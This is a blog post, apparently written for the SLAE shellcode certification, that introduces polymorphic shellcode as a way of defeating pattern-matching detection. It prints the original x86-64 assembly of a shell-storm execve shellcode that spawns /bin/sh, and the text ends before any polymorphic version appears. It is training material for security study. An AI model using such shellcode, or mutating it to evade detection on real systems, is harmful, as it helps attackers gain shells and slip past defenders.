---
layout: post
title: Polymorphic Shellcode
date: 2021-01-17 20:30:00
categories: posts
comments: false
en: true
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. 

According to wikipedia, "Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each 
time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and 
operations.". This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.

Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands! 

The sixth assignment from the seven requires taking three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) from [shell-storm.org](http://shell-storm.org/) and generate 
polymorphic versions of such. In addition, its size should not be bigger than 150%.

#### Execve Shellcode (Shellcode #1)

The first shellcode from the three will be one that executes ```/bin/sh``` through the ```execve``` syscall. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-603.php). 

###### Original code

```term
    section .text
            global _start
 
    _start:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            push    rbx
            mov     rdi, rsp
            push    rax
            push    rdi
            mov     rsi, rsp
            mov     al, 0x3b
            syscall
```

